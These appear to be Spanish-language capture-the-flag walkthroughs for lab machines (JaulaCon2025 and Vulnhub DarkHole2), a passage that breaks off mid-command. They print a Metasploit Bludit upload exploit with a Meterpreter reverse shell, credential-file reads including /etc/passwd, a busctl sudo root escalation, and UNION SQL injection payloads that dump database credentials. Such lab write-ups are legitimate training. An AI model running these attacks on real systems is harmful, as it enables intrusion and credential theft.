https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes The base path for Bludit VHOST no HTTP server virtual host Payload options (php/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192.168.44.128 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Bludit v3.9.2 View the full module info with the info, or info -d command.\rVamos a ir poniendo los datos respectos solicitados:\nmsf6 exploit(linux/http/bludit_upload_images_exec) \u0026gt; set BLUDITPASS cassandra BLUDITPASS =\u0026gt; cassandra msf6 exploit(linux/http/bludit_upload_images_exec) \u0026gt; set BLUDITUSER Jaulacon2025 BLUDITUSER =\u0026gt; Jaulacon2025 msf6 exploit(linux/http/bludit_upload_images_exec) \u0026gt; set RHOST jaulacon2025.thl RHOST =\u0026gt; jaulacon2025.thl\rAhora pondremos run y veremos si funciona:\nmsf6 exploit(linux/http/bludit_upload_images_exec) \u0026gt; run [*] Started reverse TCP handler on 192.168.44.128:4444 [+] Logged in as: Jaulacon2025 [*] Retrieving UUID... [*] Uploading AigqPgXPSs.png... [*] Uploading .htaccess... [*] Executing AigqPgXPSs.png... [*] Sending stage (40004 bytes) to 192.168.44.131 [+] Deleted .htaccess [*] Meterpreter session 1 opened (192.168.44.128:4444 -\u0026gt; 192.168.44.131:40574) at 2025-07-19 17:37:38 +0200\rAhora pondremos shell para tener ya acceso a la máquina:\nmeterpreter \u0026gt; shell Process 3135 created. Channel 0 created. whoami www-data\rShell as JaulaCon2025 Leyendo la documentación de Bludit encontré lo siguiente:\nhttps://docs.bludit.com/en/developers/folder-structure En las primeras lineas comenta lo siguiente:\n/bl-content/ \u0026lt;-- Databases and uploaded images\rVemos que en esa carpeta contiene el tema de las bases de datos, vamos a verla:\nwww-data@JaulaCon2025:/var/www/html/bl-content/databases$ ls ls categories.php plugins site.php tags.php pages.php security.php syslog.php users.php www-data@JaulaCon2025:/var/www/html/bl-content/databases$\rVemos un users.php vamos a leerlo:\n[..] \u0026#34;JaulaCon2025\u0026#34;: { \u0026#34;firstName\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;lastName\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;nickname\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;role\u0026#34;: \u0026#34;author\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;551211bcd6ef18e32742a73fcb85430b\u0026#34;, \u0026#34;salt\u0026#34;: \u0026#34;jejej\u0026#34;, \u0026#34;email\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;registered\u0026#34;: \u0026#34;2025-03-25 19:43:25\u0026#34;, \u0026#34;tokenRemember\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;tokenAuth\u0026#34;: \u0026#34;d1ed37a30b769e2e48123c3efaa1e357\u0026#34;, \u0026#34;tokenAuthTTL\u0026#34;: \u0026#34;2009-03-15 14:00\u0026#34;, \u0026#34;twitter\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;facebook\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;codepen\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;instagram\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;github\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;gitlab\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;linkedin\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;mastodon\u0026#34;: \u0026#34;\u0026#34; } }\rTenemos en MD5 la contraseña del usuario JaulaCon2025. Para confirmar vamos a leer el /etc/passwd para ver si existe en el sistema:\nwww-data@JaulaCon2025:/var/www/html/bl-content/databases$ cat /etc/passwd cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin _apt:x:42:65534::/nonexistent:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin messagebus:x:100:107::/nonexistent:/usr/sbin/nologin sshd:x:101:65534::/run/sshd:/usr/sbin/nologin debian:x:1000:1000:debian,,,:/home/debian:/bin/bash mysql:x:102:110:MySQL Server,,,:/nonexistent:/bin/false JaulaCon2025:x:1001:1001::/home/JaulaCon2025:/bin/bash\rExiste, vamos a usar CrackStation para intentar crackear la contraseña:\nBien!! Vamos a probar a iniciar por SSH:\n┌──(pylon㉿kali)-[~/…/pylon/THL/JaulaCon2025/exploits] └─$ ssh JaulaCon2025@192.168.44.131 JaulaCon2025@192.168.44.131\u0026#39;s password: Linux JaulaCon2025 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Sat Jul 19 18:13:44 2025 from 192.168.44.128 JaulaCon2025@JaulaCon2025:~$\rShell as root Vamos a ver si tenemos algún permiso SUDOERS en la máquina, para ello haremos un sudo -l:\nJaulaCon2025@JaulaCon2025:~$ sudo -l sudo: unable to resolve host JaulaCon2025: Nombre o servicio desconocido Matching Defaults entries for JaulaCon2025 on JaulaCon2025: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty User JaulaCon2025 may run the following commands on JaulaCon2025: (root) NOPASSWD: /usr/bin/busctl\rSi buscamos este binario en GTFObins nos comenta lo siguiente para abusar de el:\nsudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/bash,argv1=-c,argv2=\u0026#39;/bin/bash -i 0\u0026lt;\u0026amp;2 1\u0026gt;\u0026amp;2\u0026#39;\rVamos a explotarlo:\nJaulaCon2025@JaulaCon2025:~$ sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/bash,argv1=-c,argv2=\u0026#39;/bin/bash -i 0\u0026lt;\u0026amp;2 1\u0026gt;\u0026amp;2\u0026#39; sudo: unable to resolve host JaulaCon2025: Nombre o servicio desconocido root@JaulaCon2025:/home/JaulaCon2025# whoami root\rroot! ;)\n","date":"2025-07-19","id":12,"permalink":"/writeups/thehackerslabs/jaulacon2025/","summary":"Enumeration Vamos a empezar con un escaneo nmap:\n┌──(venv)─(pylon㉿kali)-[~/…/pylon/THL/JaulaCon2025/nmap] └─$ nmap -p- --open -sS -n -Pn -vvv --min-rate=5000 192.168.44.131 Starting Nmap 7.","tags":[],"title":"JaulaCon2025"},{"content":"Enumeration Vamos a empezar escaneando la red local:\n┌──(pylon㉿kali)-[~/…/pylon/Vulnhub/DarkHole2/nmap] └─$ sudo arp-scan -I eth0 --localnet [sudo] password for pylon: Interface: eth0, type: EN10MB, MAC: 00:0c:29:9e:99:b0, IPv4: 192.168.64.128 Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.64.1 00:50:56:c0:00:08 VMware, Inc. 192.168.64.2 00:50:56:fb:55:46 VMware, Inc. 192.168.64.129 00:0c:29:95:1b:eb VMware, Inc. 192.168.64.254 00:50:56:ed:c4:96 VMware, Inc. 4 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.10.0: 256 hosts scanned in 1.922 seconds (133.19 hosts/sec). 4 responded\rPor la direción MAC identifico la IP de la máquina que es la 192.168.64.129. Ahora vamos a realizar un escaneo de puertos con nmap:\n┌──(pylon㉿kali)-[~/…/pylon/Vulnhub/DarkHole2/nmap] └─$ nmap -p- --open -sS -n -Pn -vvv 192.168.64.129 -oG ports Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 13:18 CEST Initiating ARP Ping Scan at 13:18 Scanning 192.168.64.129 [1 port] Completed ARP Ping Scan at 13:18, 0.04s elapsed (1 total hosts) Initiating SYN Stealth Scan at 13:18 Scanning 192.168.64.129 [65535 ports] Discovered open port 80/tcp on 192.168.64.129 Discovered open port 22/tcp on 192.168.64.129 Completed SYN Stealth Scan at 13:18, 0.97s elapsed (65535 total ports) Nmap scan report for 192.168.64.129 Host is up, received arp-response (0.00060s latency). Scanned at 2025-07-01 13:18:21 CEST for 1s Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 64 80/tcp open http syn-ack ttl 64 MAC Address: 00:0C:29:95:1B:EB (VMware) Read data files from: /usr/share/nmap Nmap done: 1 IP address (1 host up) scanned in 1.13 seconds Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)\rVemos que tiene el puerto 22 y 80 abierto, vamos a realizar un segundo escaneo para identificar que servicios y versiones están corriendo:\n# Nmap 7.95 scan initiated Tue Jul 1 13:19:34 2025 as: /usr/lib/nmap/nmap --privileged -p22,80 -sCV -oN target 192.168.64.129 Nmap scan report for 192.168.64.129 Host is up (0.00015s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 57:b1:f5:64:28:98:91:51:6d:70:76:6e:a5:52:43:5d (RSA) | 256 cc:64:fd:7c:d8:5e:48:8a:28:98:91:b9:e4:1e:6d:a8 (ECDSA) |_ 256 9e:77:08:a4:52:9f:33:8d:96:19:ba:75:71:27:bd:60 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set | http-git: | 192.168.64.129:80/.git/ | Git repository found! | Repository description: Unnamed repository; edit this file \u0026#39;description\u0026#39; to name the... |_ Last commit message: i changed login.php file for more secure |_http-title: DarkHole V2 MAC Address: 00:0C:29:95:1B:EB (VMware) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Jul 1 13:19:40 2025 -- 1 IP address (1 host up) scanned in 6.53 seconds\rVemos lo siguiente:\nPuerto Información 22/tcp OpenSSH 8.2p1 Ubuntu 80/tcp Apache httpd 2.4.41 / Nos reporta que a encontrado el directorio .git . Al ver que esta expuesto la carpeta .git decido dumpearla con git-dumper :\n┌──(venv)─(pylon㉿kali)-[~/…/pylon/Vulnhub/DarkHole2/content] └─$ git-dumper http://192.168.64.129/.git/ git [-] Testing http://192.168.64.129/.git/HEAD [200] [-] Testing http://192.168.64.129/.git/ [200] [-] Fetching .git recursively [-] Fetching http://192.168.64.129/.git/ [200] [-] Fetching http://192.168.64.129/.gitignore [404] [-] Fetching http://192.168.64.129/.git/COMMIT_EDITMSG [200] [-] Fetching http://192.168.64.129/.git/HEAD [200] [-] Fetching http://192.168.64.129/.git/config [200] [-] Fetching http://192.168.64.129/.git/info/ [200] [-] Fetching http://192.168.64.129/.git/hooks/ [200] [-] Fetching http://192.168.64.129/.git/logs/ [200] [-] Fetching http://192.168.64.129/.git/info/exclude [200] [-] Fetching http://192.168.64.129/.git/description [200] [-] Fetching http://192.168.64.129/.git/logs/refs/ [200] [-] Fetching http://192.168.64.129/.git/objects/ [200] [-] Fetching http://192.168.64.129/.git/index [200] [-] Fetching http://192.168.64.129/.git/refs/ [200] [-] Fetching http://192.168.64.129/.git/hooks/commit-msg.sample [200] [-] Fetching http://192.168.64.129/.git/hooks/post-update.sample [200] [-] Fetching http://192.168.64.129/.git/hooks/fsmonitor-watchman.sample [200] [-] Fetching http://192.168.64.129/.git/logs/HEAD [200] [-] Fetching http://192.168.64.129/.git/hooks/pre-merge-commit.sample [200] [-] Fetching http://192.168.64.129/.git/hooks/pre-push.sample [200] [-] Fetching http://192.168.64.129/.git/hooks/pre-commit.sample [200] [-] Fetching http://192.168.64.129/.git/hooks/pre-rebase.sample [200] [-] Fetching http://192.168.64.129/.git/hooks/prepare-commit-msg.sample [200] [-] Fetching http://192.168.64.129/.git/hooks/push-to-checkout.sample [200] [-] Fetching http://192.168.64.129/.git/hooks/pre-receive.sample [200] [-] Fetching http://192.168.64.129/.git/hooks/applypatch-msg.sample [200] [-] Fetching http://192.168.64.129/.git/hooks/update.sample [200] [-] Fetching http://192.168.64.129/.git/hooks/pre-applypatch.sample [200] [-] Fetching http://192.168.64.129/.git/logs/refs/heads/ [200] [-] Fetching http://192.168.64.129/.git/objects/04/ [200] [-] Fetching http://192.168.64.129/.git/refs/tags/ [200] [-] Fetching http://192.168.64.129/.git/objects/09/ [200] [-] Fetching http://192.168.64.129/.git/objects/4e/ [200] [-] Fetching http://192.168.64.129/.git/refs/heads/ [200] [-] Fetching http://192.168.64.129/.git/objects/8b/ [200] [-] Fetching http://192.168.64.129/.git/objects/9d/ [200] [-] Fetching http://192.168.64.129/.git/objects/32/ [200] [-] Fetching http://192.168.64.129/.git/objects/8a/ [200] [-] Fetching http://192.168.64.129/.git/objects/6e/ [200] [-] Fetching http://192.168.64.129/.git/objects/0f/ [200] [-] Fetching http://192.168.64.129/.git/objects/7f/ [200] [-] Fetching http://192.168.64.129/.git/objects/66/ [200] [-] Fetching http://192.168.64.129/.git/objects/49/ [200] [-] Fetching http://192.168.64.129/.git/objects/a2/ [200] [-] Fetching http://192.168.64.129/.git/objects/93/ [200] [-] Fetching http://192.168.64.129/.git/objects/59/ [200] [-] Fetching http://192.168.64.129/.git/objects/77/ [200] [-] Fetching http://192.168.64.129/.git/objects/b2/ [200] [-] Fetching http://192.168.64.129/.git/objects/b6/ [200] [-] Fetching http://192.168.64.129/.git/objects/56/ [200] [-] Fetching http://192.168.64.129/.git/objects/e6/ [200] [-] Fetching http://192.168.64.129/.git/objects/a4/ [200] [-] Fetching http://192.168.64.129/.git/objects/pack/ [200] [-] Fetching http://192.168.64.129/.git/objects/aa/ [200] [-] Fetching http://192.168.64.129/.git/objects/ca/ [200] [-] Fetching http://192.168.64.129/.git/objects/c1/ [200] [-] Fetching http://192.168.64.129/.git/objects/c9/ [200] [-] Fetching http://192.168.64.129/.git/objects/info/ [200] [-] Fetching http://192.168.64.129/.git/objects/8b/6cd9032d268332de09c64cbe9efa63ace3998e [200] [-] Fetching http://192.168.64.129/.git/refs/heads/master [200] [-] Fetching http://192.168.64.129/.git/objects/04/4d8b4fec000778de9fb27726de4f0f56edbd0e [200] [-] Fetching http://192.168.64.129/.git/objects/4e/b24de5b85be7cf4b2cef3f0cfc83b09a236133 [200] [-] Fetching http://192.168.64.129/.git/objects/6e/4328f5f878ed20c0b68fc8bda2133deadc49a3 [200] [-] Fetching http://192.168.64.129/.git/objects/32/580f7fb8c39cdad6a7f49839cebfe07f597bcf [200] [-] Fetching http://192.168.64.129/.git/objects/32/d0928f948af8252b0200ff9cac40534bfe230b [200] [-] Fetching http://192.168.64.129/.git/logs/refs/heads/master [200] [-] Fetching http://192.168.64.129/.git/objects/8a/0ff67b07eb0cc9b7bed4f9094862c22cab2a7d [200] [-] Fetching http://192.168.64.129/.git/objects/7f/d95a2f170cb55fbb335a56974689f659e2c383 [200] [-] Fetching http://192.168.64.129/.git/objects/09/04b1923584a0fb0ab31632de47c520db6a6e21 [200] [-] Fetching http://192.168.64.129/.git/objects/66/5001d05a7c0b6428ce22de1ae572c54cba521d [200] [-] Fetching http://192.168.64.129/.git/objects/a2/0488521df2b427246c0155570f5bfad6936c6c [200] [-] Fetching http://192.168.64.129/.git/objects/77/c09cf4b905b2c537f0a02bca81c6fbf32b9c9d [200] [-] Fetching http://192.168.64.129/.git/objects/49/151b46cc957717f5529d362115339d4abfe207 [200] [-] Fetching http://192.168.64.129/.git/objects/9d/ed9bf70f1f63a852e9e4f02df7b6d325e95c67 [200] [-] Fetching http://192.168.64.129/.git/objects/93/9b9aad671e5bcde51b4b5d99b1464e2d52ceaa [200] [-] Fetching http://192.168.64.129/.git/objects/56/987e1f75e392aae416571b38b53922c49f6e7e [200] [-] Fetching http://192.168.64.129/.git/objects/59/218997bfb0d8012a918e43bea3e497e68248a9 [200] [-] Fetching http://192.168.64.129/.git/objects/b6/f546da0ab9a91467412383909c8edc9859a363 [200] [-] Fetching http://192.168.64.129/.git/objects/b2/076545503531a2e482a89b84f387e5d44d35c0 [200] [-] Fetching http://192.168.64.129/.git/objects/e6/9de29bb2d1d6434b8b29ae775ad8c2e48c5391 [200] [-] Fetching http://192.168.64.129/.git/objects/ca/f37015411ad104985c7dd86373b3a347f71097 [200] [-] Fetching http://192.168.64.129/.git/objects/a4/d900a8d85e8938d3601f3cef113ee293028e10 [200] [-] Fetching http://192.168.64.129/.git/objects/0f/1d821f48a9cf662f285457a5ce9af6b9feb2c4 [200] [-] Fetching http://192.168.64.129/.git/objects/c9/56989b29ad0767edc6cf3a202545927c3d1e76 [200] [-] Fetching http://192.168.64.129/.git/objects/c1/ef127486aa47cd0b3435bca246594a43b559bb [200] [-] Fetching http://192.168.64.129/.git/objects/aa/2a5f3aa15bb402f2b90a07d86af57436d64917 [200] [-] Sanitizing .git/config [-] Running git checkout .\rBien ya teniendo esta información, antes de seguir con ella vamos a buscar otra, vamos a ver la aplicación web:\nPodemos ver que tiene un Login , vamos a intentar credenciales básicas:\nSe ve que pide de un correo electronico, vamos a probar en el campo de la contraseña añadir una ' a ver si sucede algo fuera de lo normal:\nSigue exactamente igual… En la web no hay gran cosa, así que vamos a ver el git:\nVamos a ver el login.php para ver si hay algo mal configurado y que podamos abusar de el:\n\u0026lt;?php session_start(); require \u0026#39;config/config.php\u0026#39;; if($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] == \u0026#39;POST\u0026#39;){ $email = mysqli_real_escape_string($connect,htmlspecialchars($_POST[\u0026#39;email\u0026#39;])); $pass = mysqli_real_escape_string($connect,htmlspecialchars($_POST[\u0026#39;password\u0026#39;])); $check = $connect-\u0026gt;query(\u0026#34;select * from users where email=\u0026#39;$email\u0026#39; and password=\u0026#39;$pass\u0026#39; and id=1\u0026#34;); if($check-\u0026gt;num_rows){ $_SESSION[\u0026#39;userid\u0026#39;] = 1; header(\u0026#34;location:dashboard.php\u0026#34;); die(); } } ?\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;style/login.css\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;script src=\u0026#34;https://kit.fontawesome.com/fe909495a1.js\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;Project_1.css\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Home\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;👋 Welcome\u0026lt;/h1\u0026gt; \u0026lt;!-- \u0026lt;a href=\u0026#34;file:///C:/Users/SAURABH%20SINGH/Desktop/HTML5/PROJECTS/Project%201/Project_1.html\u0026#34;\u0026gt;\u0026lt;h1\u0026gt;Sign In\u0026lt;/h1\u0026gt;\u0026lt;/a\u0026gt; --\u0026gt; \u0026lt;!-- \u0026lt;a href=\u0026#34;file:///C:/Users/SAURABH%20SINGH/Desktop/HTML5/PROJECTS/Project%201/P2.html\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;Log In\u0026lt;/h1\u0026gt;\u0026lt;/a\u0026gt; --\u0026gt; \u0026lt;form action=\u0026#34;\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fas fa-envelope\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;input type=\u0026#34;email\u0026#34; name=\u0026#34;email\u0026#34; id=\u0026#34;email\u0026#34; placeholder=\u0026#34;Enter Your Email\u0026#34; required\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fas fa-key\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34; id=\u0026#34;password\u0026#34; placeholder=\u0026#34;Enter Your Password\u0026#34; required\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;button id=\u0026#34;btn\u0026#34; name=\u0026#34;button\u0026#34;\u0026gt;Login\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; Viendo las primeras lineas del código veo que incluye el archivo config.php que se encuentra en el directorio config. Vamos a darle un ojo:\n\u0026lt;?php $connect = new mysqli(\u0026#34;localhost\u0026#34;,\u0026#34;root\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;darkhole_2\u0026#34;); [..]\rTenemos unas credenciales:\nUsername Password root darkhole_2 En este caso son las credenciales de acceso a la base de datos, esto nos está chivando que el usuario empleado es root con una posibilidad de tener super privilegios en la base de datos y poder realizar muchas acciones abusando de los privilegios. Pero primero necesitamos encontrar un SQLi . En el código vemos lo que hace con nuestro input:\n[..] $email = mysqli_real_escape_string($connect,htmlspecialchars($_POST[\u0026#39;email\u0026#39;])); $pass = mysqli_real_escape_string($connect,htmlspecialchars($_POST[\u0026#39;password\u0026#39;])); [..]\rVemos que nos sanitiza la entrada con mysqli_real_escape_string así que por aquí no puede a ver un SQLi. Vamos a ver los logs del .git:\n┌──(venv)─(pylon㉿kali)-[~/…/Vulnhub/DarkHole2/content/git] └─$ git log commit 0f1d821f48a9cf662f285457a5ce9af6b9feb2c4 (HEAD -\u0026gt; master) Author: Jehad Alqurashi \u0026lt;anmar-v7@hotmail.com\u0026gt; Date: Mon Aug 30 13:14:32 2021 +0300 i changed login.php file for more secure commit a4d900a8d85e8938d3601f3cef113ee293028e10 Author: Jehad Alqurashi \u0026lt;anmar-v7@hotmail.com\u0026gt; Date: Mon Aug 30 13:06:20 2021 +0300 I added login.php file with default credentials commit aa2a5f3aa15bb402f2b90a07d86af57436d64917 Author: Jehad Alqurashi \u0026lt;anmar-v7@hotmail.com\u0026gt; Date: Mon Aug 30 13:02:44 2021 +0300 First Initialize\rShell as jehad Vemos varios logs, donde en 1 vemos un correo electrónico → anmar-v7@hotmail.com. Vamos a ver que se realizó en ese log ya que comenta que añadio cosas en el login.php:\n┌──(venv)─(pylon㉿kali)-[~/…/Vulnhub/DarkHole2/content/git] 13:31:42 [2/2] └─$ git show a4d900a8d85e8938d3601f3cef113ee293028e10 commit a4d900a8d85e8938d3601f3cef113ee293028e10 Author: Jehad Alqurashi \u0026lt;anmar-v7@hotmail.com\u0026gt; Date: Mon Aug 30 13:06:20 2021 +0300 I added login.php file with default credentials diff --git a/login.php b/login.php index e69de29..8a0ff67 100644 --- a/login.php +++ b/login.php @@ -0,0 +1,42 @@ +\u0026lt;?php +session_start(); +require \u0026#39;config/config.php\u0026#39;; +if($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] == \u0026#39;POST\u0026#39;){ + if($_POST[\u0026#39;email\u0026#39;] == \u0026#34;lush@admin.com\u0026#34; \u0026amp;\u0026amp; $_POST[\u0026#39;password\u0026#39;] == \u0026#34;321\u0026#34;){ + $_SESSION[\u0026#39;userid\u0026#39;] = 1; + header(\u0026#34;location:dashboard.php\u0026#34;); + die(); + } + +} +?\u0026gt; + +\u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;style/login.css\u0026#34;\u0026gt; +\u0026lt;head\u0026gt; + \u0026lt;script src=\u0026#34;https://kit.fontawesome.com/fe909495a1.js\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; + \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;Project_1.css\u0026#34;\u0026gt; + \u0026lt;title\u0026gt;Home\u0026lt;/title\u0026gt;\rVemos otras credenciales:\nUsername Password root darkhole_2 lush@admin.com 321 Vemos que esto estaba en el login.php, vamos a ver si son válidas:\nBien!! Me estoy finjando en un detalle que es el parámetro por GET id , vamos a probar a poner una comilla simple:\nVemos que la aplicación no carga. vamos a ver que código de estado devuelve:\nVamos a emplear ORDER BY para filtrar por un número de columnas hasta encontrar el exacto:\n' order by 100-- -: Era poco probable, vamos a bajarlo a 10:\nNada… vamos a ir probando 9,8,7… hasta que de otro código de estado:\nVemos que con 6 funciona, para probar vamos a poner 7:\nVale, ya conocemos el número exacto de columnas que tiene la tabla. Vamos a emplear UNION para ver si se reflejan los “datos basura\u0026quot;:\n\u0026#39; union select 1,2,3,4,5,6-- -\rVemos que no… Ya que hay datos existentes y se reflejan primero. Vamos a probar a ir a id=2:\nVemos que aquí ya no hay datos, vamos a probar el UNION:\nVemos que se relfjan las columnas 2,3,5,6 y las columnas 1,4 no. Trabajaremos en la columna 2 ya que se refleja. Vamos a confirmar que el usuario que esta conectado a la db es root con la función user():\n\u0026#39; union select 1,user(),3,4,5,6-- -\rVamos a ver si tenemos super privilegios en la base de datos, para ello usaremos la base de datos mysql y la tabla user apuntando a la columna super_priv:\n\u0026#39; union select 1,super_priv,3,4,5,6 from mysql.user-- -\rEn este caso nos dice que Y que significa Yes así que tenemos super privilegios en la base de datos. Vamos a intentar enumerar los privilegios que tenemos:\n\u0026#39; union select 1,grantee,privilege_type,4,5,6 from information_schema.user_privileges-- -\rPodemos fijarnos en 2 problemas:\nNo vemos todos los resultados solo muestra la primera fila. Estamos viendo los privilegios de otro usuario al que no estamos interesados Para ver todos los resultados vamos a usar group_concat() que lo que hace es concatenar todas las filas en 1:\n\u0026#39; union select 1,group_concat(grantee),3,4,group_concat(privilege_type),6 from information_schema.user_privileges where grantee=\u0026#34;\u0026#39;root\u0026#39;@\u0026#39;localhost\u0026#39;\u0026#34;-- -\rPero no nos mostrará nada. Vamos a enumerar la base de datos:\n\u0026#39; union select 1,schema_name,3,4,5,6 from information_schema.schemata-- -\rVemos solo mysql y es raro, vamos a usar group_concat:\n\u0026#39; union select 1,group_concat(schema_name),3,4,5,6 from information_schema.schemata-- -\rVemos la base de datos darkhole_2, vamos a ver que db esta empleando actualmente:\n\u0026#39; union select 1,database(),3,4,5,6-- -\rVale, vamos a enumerar que tablas tiene la base de datos darkhole_2:\n\u0026#39; union select 1,group_concat(table_name),3,4,group_concat(table_schema),6 from information_schema.tables where table_schema=\u0026#39;darkhole_2\u0026#39;-- -\rExisten 2 tablas:\nusers ssh Vamos a ver la tabla users a ver que columnas contiene: \u0026#39; union select 1,group_concat(column_name),3,4,group_concat(table_name),group_concat(table_schema) from information_schema.columns where table_name=\u0026#39;users\u0026#39; and table_schema=\u0026#39;darkhole_2\u0026#39;-- -\rVemos las siguientes columnas:\naddress contact_number email id password username \u0026#39; union select 1,username,3,4,password,6 from darkhole_2.users-- -\rVemos ya las credenciales obtenidas anteriormente por los logs de git. Vamos a ver las columnas de la otra tabla llamada ssh:\n\u0026#39; union select 1,group_concat(column_name),3,4,5,6 from information_schema.columns where table_name=\u0026#39;ssh\u0026#39; and table_schema=\u0026#39;darkhole_2\u0026#39;-- -\rVamos a ver el contenido de esas columnas:\n\u0026#39; union select 1,group_concat(user),3,4,group_concat(pass),6 from darkhole_2.ssh-- -\rTenemos la siguientes credenciales:\nUsername Password Servicio root darkhole_2 mysql lush@admin.com 321 login (http) jehad fool ssh Vamos a probar las credenciales por SSH:\n┌──(pylon㉿kali)-[~/…/Vulnhub/DarkHole2/nmap/git] └─$ ssh jehad@192.168.64.129 jehad@192.168.64.129\u0026#39;s password: Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Tue 01 Jul 2025 06:13:39 PM UTC System load: 0.01 Processes: 233 Usage of /: 49.9% of 12.73GB Users logged in: 0 Memory usage: 20% IPv4 address for ens33: 192.168.64.129 Swap usage: 0% * Super-optimized for small spaces - read how we shrank the memory footprint of MicroK8s to make it the smallest full K8s around. https://ubuntu.com/blog/microk8s-memory-optimisation 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Last login: Fri Sep 3 05:49:05 2021 from 192.168.135.128 jehad@darkhole:~$\rShell as losy Vamos a ver el .bash_history de nuestro usuario actual jehad:\njehad@darkhole:~$ cat .bash_history [..] curl http://localhost:9999 curl \u0026#34;http://localhost:999/?cmd=id\u0026#34; curl \u0026#34;http://localhost:9999/?cmd=id\u0026#34; curl http://localhost:9999/ [..]\rVemos que ha realizado peticiones por GET al puerto 9999 que estaría corriendo en localhost, vamos a comprobar si sigue activo:\njehad@darkhole:~$ ss -anot State Recv-Q Send-Q Local 